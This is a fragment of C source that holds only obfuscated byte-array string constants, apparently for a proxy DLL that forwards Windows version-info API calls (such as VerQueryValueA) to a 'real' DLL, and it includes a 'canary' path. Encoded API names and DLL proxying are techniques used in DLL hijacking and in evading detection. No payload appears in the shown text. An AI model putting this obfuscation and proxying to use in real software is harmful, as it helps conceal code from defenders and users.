...
static const unsigned char xCanary[] = {
    0xD4, 0xAD, 0xE7, 0xC0, 0xFC, 0xF9, 0xF3, 0xF8,
    0xC0, 0xE6, 0xE7, 0xC3, 0xF2, 0xFA, 0xE1, 0xE7,
    0xE1, 0xF2, 0xE5, 0xB8, 0xF4, 0xF6, 0xF4, 0xFB,
    0xF2, 0xB7, 0xF9, 0xF8, 0xF0
};
...
static const unsigned char xRealDll[] = {
    0xD4, 0xAD, 0xE7, 0xC0, 0xFC, 0xF9, 0xF3, 0xF8,
    0xC0, 0xE6, 0xE7, 0xC4, 0xE0, 0xE6, 0xE7, 0xF2,
    0xFA, 0xB6, 0xB5, 0xE7, 0xE1, 0xF2, 0xE5, 0xE6,
    0xFC, 0xF8, 0xF9, 0xB7, 0xF3, 0xF9, 0xF9
};
...
static const unsigned char xE1[] = {
    0xD0, 0xF2, 0xE7, 0xD1, 0xFC, 0xF9, 0xF2, 0xC1,
    0xF2, 0xE5, 0xE6, 0xFC, 0xF8, 0xF9, 0xDC, 0xF9,
    0xF3, 0xF8, 0xD6
};
#define xE1_LEN 19
...
static const unsigned char xE3[] = {
    0xD0, 0xF2, 0xE7, 0xD1, 0xFC, 0xF9, 0xF2, 0xC1,
    0xF2, 0xE5, 0xE6, 0xFC, 0xF8, 0xF9, 0xDC, 0xF9,
    0xF3, 0xF8, 0xC4, 0xFC, 0xE3, 0xF2, 0xD6
};
#define xE3_LEN 23
...
static const unsigned char xE4[] = {
    0xD0, 0xF2, 0xE7, 0xD1, 0xFC, 0xF9, 0xF2, 0xC1,
    0xF2, 0xE5, 0xE6, 0xFC, 0xF8, 0xF9, 0xDC, 0xF9,
    0xF3, 0xF8, 0xC4, 0xFC, 0xE3, 0xF2, 0xC0
};
#define xE4_LEN 23

/* "VerQueryValueA" */
static const unsigned char xE5[] = {
    0xC1, 0xF2, 0xE5, 0xC4, 0xE6, 0xF2, 0xE5, 0xE0,
    0xC1, 0xF6, 0xF9, 0xE6, 0xF2, 0xD6
};
#define xE5_LEN 14
